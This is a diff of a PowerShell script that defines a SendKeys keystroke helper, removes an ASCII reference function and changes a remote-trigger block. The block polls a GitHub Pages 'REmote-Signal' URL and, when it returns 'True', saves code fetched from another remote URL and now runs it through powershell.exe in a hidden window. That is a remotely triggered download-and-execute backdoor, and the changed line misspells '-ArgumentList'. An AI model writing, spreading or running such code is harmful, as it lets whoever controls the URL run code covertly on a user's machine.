@@ -19,38 +19,7 @@ function Press-Key {<br>
     $vol = (New-Object -ComObject WScript.Shell)<br>
     $vol.SendKeys([char]$ASCIInumber)<br>
 }<br>
-function Get-ASCIINumber {<br>
-    Write-Host "<br>
-    Control Characters:<br>
-0: NUL (Null)<br>
-1: SOH (Start of Heading)<br>
-2: STX (Start of Text)<br>
-3: ETX (End of Text)<br>
-4: EOT (End of Transmission)<br>
-5: ENQ (Enquiry)<br>
-6: ACK (Acknowledge)<br>
-7: BEL (Bell)<br>
-8: BS (Backspace)<br>
-9: TAB (Horizontal Tab)<br>
-10: LF (Line Feed)<br>
-11: VT (Vertical Tab)<br>
-12: FF (Form Feed)<br>
-13: CR (Carriage Return)<br>
-14: SO (Shift Out)<br>
-15: SI (Shift In)<br>
-16–31: Various device control codes<br>
-127: DEL (Delete)<br>
-    Printable Characters:<br>
-32: Space<br>
-33–47: ! '' # $ % & ' ( ) * + , - . /<br>
-48–57: 0–9<br>
-58–64: : ; < = > ? @<br>
-65–90: A–Z<br>
-91–96: [ \ ] ^ _ `<br>
-97–122: a–z<br>
-123–126: { | } ~<br>
 <br>
-    "<br>
 }<br>
 function Replace-String {<br>
     param ($Str, $Repstr, $Repstrwith)<br>
@@ -191,7 +160,7 @@ $contents = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmot
 $signal = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-Signal/" #in progress<br>
 if ($signal -eq "True") {<br>
 Set-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Value $contents<br>
-Start-Process -FilePath "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -WindowStyle Hidden<br>
+Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArguementList "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -WindowStyle Hidden<br>
 }<br>
 }<br>
 </p>
